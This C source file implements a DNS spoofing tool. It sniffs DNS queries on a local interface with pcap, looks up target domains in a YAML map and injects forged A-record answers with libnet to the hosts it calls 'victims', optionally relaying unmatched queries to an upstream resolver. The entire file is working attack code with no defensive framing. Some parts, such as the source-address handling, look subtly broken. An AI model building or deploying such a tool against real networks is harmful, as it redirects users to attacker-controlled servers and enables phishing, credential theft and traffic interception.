
 #define _GNU_SOURCE
 #include <arpa/inet.h>
 #include <errno.h>
 #include <getopt.h>
 #include <netinet/udp.h>
 #include <pcap/pcap.h>
 #include <pthread.h>
 #include <signal.h>
 #include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <yaml.h>
 #include <libnet.h>
 
 /* ------------------------------------------------------------------------- */
 /* Basic DNS structs (only what we need)                                     */
 /* ------------------------------------------------------------------------- */
 struct dnshdr {
     uint16_t id;
     uint16_t flags;
     uint16_t qdcount;
     uint16_t ancount;
     uint16_t nscount;
     uint16_t arcount;
 } __attribute__((packed));
 
 #define DNS_QR(x)   (((x) & 0x8000) >> 15)
 #define DNS_OPCODE(x) (((x) & 0x7800) >> 11)
 
 #define DNS_PORT 53
 #define SNAPLEN 512
 
 /* ------------------------------------------------------------------------- */
 /* Simple mapping store                                                      */
 /* ------------------------------------------------------------------------- */
 typedef struct mapping {
     char  *pattern;           /* original key, lowercase                */
     char  ip[16];             /* dotted quad                            */
     struct mapping *next;
 } mapping_t;
 
 static mapping_t *map_head = NULL;
 
 static void insert_mapping(const char *key, const char *val) {
     mapping_t *m = calloc(1, sizeof(*m));
     m->pattern = strdup(key);
     strncpy(m->ip, val, sizeof(m->ip)-1);
     m->next = map_head;
     map_head = m;
 }
 
 /* naive wildcard match: "*.domain.tld" */
 static const char *lookup_spoof_ip(const char *qname) {
     for (mapping_t *m = map_head; m; m = m->next) {
         if (m->pattern[0] == '*' && m->pattern[1] == '.') {
             size_t plen = strlen(m->pattern+1);      /* incl dot */
             size_t qlen = strlen(qname);
             if (qlen >= plen && !strcasecmp(qname + qlen - plen, m->pattern+1))
                 return m->ip;
         } else if (!strcasecmp(qname, m->pattern)) {
             return m->ip;
         }
     }
     return NULL;
 }
 
 /* free mappings */
 static void free_mappings(void) {
     while (map_head) {
         mapping_t *t = map_head;
         map_head = map_head->next;
         free(t->pattern);
         free(t);
     }
 }
 
 /* ------------------------------------------------------------------------- */
 /* YAML loader (keys = domain, value = IP)                                   */
 /* ------------------------------------------------------------------------- */
 static bool load_yaml(const char *fname) {
     FILE *fh = fopen(fname, "rb");
     if (!fh) { perror("open map"); return false; }
 
     yaml_parser_t parser;
     if (!yaml_parser_initialize(&parser)) { fprintf(stderr,"libyaml init error\n"); return false; }
     yaml_parser_set_input_file(&parser, fh);
 
     yaml_event_t ev;
     char *current_key = NULL;
 
     while (yaml_parser_parse(&parser, &ev)) {
         switch (ev.type) {
         case YAML_SCALAR_EVENT:
             if (!current_key) {                 /* key */
                 current_key = strndup((char*)ev.data.scalar.value,
                                        ev.data.scalar.length);
                 for (char *p=current_key; *p; ++p) *p=tolower(*p);
             } else {                            /* value */
                 char *val = strndup((char*)ev.data.scalar.value,
                                      ev.data.scalar.length);
                 struct in_addr tmp;
                 if (inet_aton(val, &tmp))
                     insert_mapping(current_key, val);
                 else
                     fprintf(stderr,"[!] invalid IP in map: %s\n", val);
                 free(val);
                 free(current_key);
                 current_key = NULL;
             }
             break;
         default: break;
         }
         if (ev.type == YAML_STREAM_END_EVENT) break;
         yaml_event_delete(&ev);
     }
     yaml_event_delete(&ev);
     yaml_parser_delete(&parser);
     fclose(fh);
     return map_head != NULL;
 }
 
 /* ------------------------------------------------------------------------- */
 /* Globals from CLI                                                          */
 /* ------------------------------------------------------------------------- */
 static const char *iface = NULL;
 static bool do_relay = false;
 static char upstream_ip[16] = "8.8.8.8";
 
 /* pcap & libnet handles */
 static pcap_t *pcap = NULL;
 static libnet_t *lnet = NULL;
 
 /* stop flag */
 static volatile sig_atomic_t running = 1;
 static void sigint(int sig){ (void)sig; running = 0; }
 
 /* ------------------------------------------------------------------------- */
 /* DNS name helpers                                                          */
 /* ------------------------------------------------------------------------- */
 static char *dns_name_to_str(const uint8_t *pkt, const uint8_t *ptr,
                              char *out, size_t max) {
     size_t len=0;
     while (*ptr && len < max-1) {
         uint8_t l = *ptr++;
         if (l & 0xC0) return NULL; /* compression not expected in queries */
         if (len) out[len++]='.';
         if (len + l >= max-1) break;
         memcpy(out+len, ptr, l);
         ptr += l;
         len += l;
     }
     out[len]='\0';
     return out;
 }
 
 /* build compressed name pointer (single pointer to question name: 0xC00C) */
 #define NAME_PTR 0xC00C
 
 /* ------------------------------------------------------------------------- */
 /* Build and send forged answer                                              */
 /* ------------------------------------------------------------------------- */
 static void send_spoof(const uint8_t *orig_pkt,
                        const struct pcap_pkthdr *hdr,
                        const char *victim_ip,
                        const char *spoof_ip) {
 
     const struct libnet_ipv4_hdr *orig_ip =
         (const struct libnet_ipv4_hdr*)(orig_pkt + 14); /* Ethernet 14 */
     const struct libnet_udp_hdr  *orig_udp =
         (const struct libnet_udp_hdr *)((const uint8_t*)orig_ip +
                                         (orig_ip->ip_hl*4));
 
     uint16_t dns_len = ntohs(orig_udp->uh_ulen) - sizeof(struct udphdr);
     const uint8_t *dns_payload = (const uint8_t*)(orig_udp+1);
 
     /* Parse header to reuse ID / question */
     const struct dnshdr *dh = (const struct dnshdr*)dns_payload;
     const uint8_t *qname = dns_payload + sizeof(struct dnshdr);
 
     /* allocate answer: header + qname+2 + qtype/qclass + rr */
     uint8_t ans[512] = {0};
     struct dnshdr *ah = (struct dnshdr*)ans;
     uint8_t *p = (uint8_t*)(ah+1);
 
     size_t qnamelen = strlen((char*)qname)+2; /* incl len bytes & zero */
     memcpy(p, qname, qnamelen);
     p += qnamelen;
 
     uint16_t qtype_qclass;
     memcpy(&qtype_qclass, qname + qnamelen, 4);  /* orig QTYPE/QCLASS */
     memcpy(p, qname + qnamelen, 4);              /* copy into answer question */
     p += 4;
 
     /* fill header */
     ah->id      = dh->id;
     ah->flags   = htons(0x8180); /* QR=1, AA=1, RCODE=0 */
     ah->qdcount = htons(1);
     ah->ancount = htons(1);
 
     /* RR */
     uint16_t *rr_name = (uint16_t*)p; *rr_name = htons(NAME_PTR); p+=2;
     uint16_t *rr_type = (uint16_t*)p; *rr_type = htons(1);       p+=2; /* A */
     uint16_t *rr_cls  = (uint16_t*)p; *rr_cls  = htons(1);       p+=2; /* IN */
     uint32_t *rr_ttl  = (uint32_t*)p; *rr_ttl = htonl(300);      p+=4;
     uint16_t *rr_len  = (uint16_t*)p; *rr_len = htons(4);        p+=2;
     inet_pton(AF_INET, spoof_ip, p); p+=4;
 
     size_t ans_size = p - ans;
 
     /* build packet with libnet */
     libnet_clear_packet(lnet);
 
     libnet_build_dnsv4( LIBNET_UDP_DNSV4_H,
                         ans, ans_size,
                         lnet, 0); /* returns payload id */
 
     libnet_build_udp( 53,                        /* source port */
                      ntohs(orig_udp->uh_sport),  /* dest port */
                      LIBNET_UDP_H + ans_size,    /* len */
                      0,                          /* checksum (autofill) */
                      NULL, 0, lnet, 0);
 
     libnet_build_ipv4( LIBNET_IPV4_H + LIBNET_UDP_H + ans_size,
                       0, libnet_get_prand(LIBNET_PRu16),
                       0, 64, IPPROTO_UDP,
                       0,
                       inet_addr(orig_ip->ip_dst.s_addr ?
                                 (char*)&orig_ip->ip_dst.s_addr : spoof_ip), /* src */
                       inet_addr(victim_ip),                                /* dst */
                       NULL, 0, lnet, 0);
 
     if (libnet_write(lnet) == -1)
         fprintf(stderr,"libnet_write: %s\n", libnet_geterror(lnet));
     else
         printf("[+] Spoofed %s → %s for %s\n",
                (char*)qname+1, spoof_ip, victim_ip);
 }
 
 /* ------------------------------------------------------------------------- */
 /* Relay unmatched query                                                     */
 /* ------------------------------------------------------------------------- */
 static void relay_and_forward(const uint8_t *orig_pkt,
                               const struct pcap_pkthdr *hdr,
                               const char *victim_ip) {
 
     const struct libnet_ipv4_hdr *orig_ip =
         (const struct libnet_ipv4_hdr*)(orig_pkt + 14);
     const struct libnet_udp_hdr  *orig_udp =
         (const struct libnet_udp_hdr *)((const uint8_t*)orig_ip +
                                         (orig_ip->ip_hl*4));
     const uint8_t *dns_payload = (const uint8_t*)(orig_udp+1);
     uint16_t query_len = ntohs(orig_udp->uh_ulen) - sizeof(struct udphdr);
 
     /* send to upstream */
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     struct sockaddr_in dst = { .sin_family=AF_INET, .sin_port=htons(53) };
     inet_pton(AF_INET, upstream_ip, &dst.sin_addr);
     struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };
     setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
     sendto(sock, dns_payload, query_len, 0,
            (struct sockaddr*)&dst, sizeof(dst));
 
     uint8_t buf[512];
     ssize_t n = recv(sock, buf, sizeof(buf), 0);
     if (n <= 0) {
         printf("[!] Upstream DNS timeout; dropping query\n");
         close(sock); return;
     }
     close(sock);
 
     /* craft response back to victim */
     libnet_clear_packet(lnet);
 
     libnet_build_dnsv4( LIBNET_UDP_DNSV4_H,
                         buf, (uint16_t)n,
                         lnet, 0);
 
     libnet_build_udp( 53,                        /* src */
                       ntohs(orig_udp->uh_sport), /* dst */
                       LIBNET_UDP_H + n, 0,
                       NULL, 0, lnet, 0);
 
     libnet_build_ipv4( LIBNET_IPV4_H + LIBNET_UDP_H + n,
                       0, libnet_get_prand(LIBNET_PRu16),
                       0, 64, IPPROTO_UDP,
                       0,
                       inet_addr(orig_ip->ip_dst.s_addr ?
                                 (char*)&orig_ip->ip_dst.s_addr : upstream_ip),
                       inet_addr(victim_ip),
                       NULL, 0, lnet, 0);
 
     if (libnet_write(lnet) == -1)
         fprintf(stderr,"libnet_write: %s\n", libnet_geterror(lnet));
     else
         printf("[=] Relayed answer to %s\n", victim_ip);
 }
 
 /* ------------------------------------------------------------------------- */
 /* pcap callback                                                             */
 /* ------------------------------------------------------------------------- */
 static void pkt_handler(u_char *user,
                         const struct pcap_pkthdr *hdr,
                         const u_char *bytes) {
 
     if (hdr->caplen < 14 + sizeof(struct libnet_ipv4_hdr) +
                       sizeof(struct libnet_udp_hdr) + sizeof(struct dnshdr))
         return;
 
     const struct libnet_ipv4_hdr *ip =
         (const struct libnet_ipv4_hdr*)(bytes + 14);
     if (ip->ip_p != IPPROTO_UDP) return;
 
     const struct libnet_udp_hdr *udp =
         (const struct libnet_udp_hdr*)((const uint8_t*)ip + (ip->ip_hl*4));
     if (ntohs(udp->uh_dport) != DNS_PORT) return;
 
     const uint8_t *dns_payload = (const uint8_t*)(udp+1);
     const struct dnshdr *dh = (const struct dnshdr*)dns_payload;
     if (DNS_QR(ntohs(dh->flags)) != 0) return; /* not a query */
 
     /* extract qname */
     char qname[256];
     if (!dns_name_to_str(dns_payload, dns_payload+sizeof(struct dnshdr),
                          qname, sizeof(qname)))
         return;
 
     const char *victim_ip = inet_ntoa(*(struct in_addr*)&ip->ip_src);
     const char *spoof_ip = lookup_spoof_ip(qname);
 
     if (spoof_ip) {
         send_spoof(bytes, hdr, victim_ip, spoof_ip);
     } else if (do_relay) {
         relay_and_forward(bytes, hdr, victim_ip);
     }
 }
 
 /* ------------------------------------------------------------------------- */
 /* Thread wrapper for pcap_loop                                              */
 /* ------------------------------------------------------------------------- */
 static void *sniff_thread(void *arg) {
     (void)arg;
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_loop(pcap, 0, pkt_handler, NULL);
     return NULL;
 }
 
 /* ------------------------------------------------------------------------- */
 /* Main                                                                      */
 /* ------------------------------------------------------------------------- */
 int main(int argc, char **argv) {
 
     static struct option longopts[] = {
         {"iface",    required_argument, 0, 'i'},
         {"map",      required_argument, 0, 'm'},
         {"relay",    no_argument,       0,  1 },
         {"upstream", required_argument, 0,  2 },
         {0,0,0,0}
     };
 
     const char *map_file = NULL;
     int opt, idx;
     while ((opt = getopt_long(argc, argv, "i:m:", longopts, &idx)) != -1) {
         switch (opt) {
         case 'i': iface = optarg; break;
         case 'm': map_file = optarg; break;
         case 1 : do_relay = true; break;
         case 2 : strncpy(upstream_ip, optarg, sizeof(upstream_ip)-1); break;
         default:
             fprintf(stderr,"Usage: %s -i IFACE -m MAP.yml [--relay] [--upstream IP]\n", argv[0]);
             return 1;
         }
     }
     if (!iface || !map_file) {
         fprintf(stderr,"[-] --iface and --map required\n"); return 1;
     }
     if (!load_yaml(map_file)) {
         fprintf(stderr,"[-] No valid mappings – aborting\n"); return 1;
     }
 
     /* libnet init */
     char errbuf_net[LIBNET_ERRBUF_SIZE];
     lnet = libnet_init(LIBNET_LINK, iface, errbuf_net);
     if (!lnet) { fprintf(stderr,"libnet_init: %s\n", errbuf_net); return 1; }
 
     /* pcap init */
     char errbuf_pcap[PCAP_ERRBUF_SIZE];
     pcap = pcap_open_live(iface, SNAPLEN, 1, 1000, errbuf_pcap);
     if (!pcap) { fprintf(stderr,"pcap: %s\n", errbuf_pcap); return 1; }
     if (pcap_set_datalink(pcap, DLT_EN10MB) != 0) {
         fprintf(stderr,"pcap: must be Ethernet\n"); return 1;
     }
     struct bpf_program fp;
     if (pcap_compile(pcap, &fp, "udp port 53", 0, PCAP_NETMASK_UNKNOWN) == -1 ||
         pcap_setfilter(pcap, &fp) == -1) {
         fprintf(stderr,"pcap filter error\n"); return 1;
     }
     pcap_freecode(&fp);
 
     printf("[*] DNS spoofing active on %s – relay=%s, upstream=%s\n",
            iface, do_relay?"yes":"no", upstream_ip);
 
     signal(SIGINT, sigint);
 
     pthread_t th;
     pthread_create(&th, NULL, sniff_thread, NULL);
 
     while (running)
         sleep(1);
 
     pcap_breakloop(pcap);
     pthread_join(th, NULL);
 
     pcap_close(pcap);
     libnet_destroy(lnet);
     free_mappings();
     puts("[+] Bye!");
     return 0;
 }
 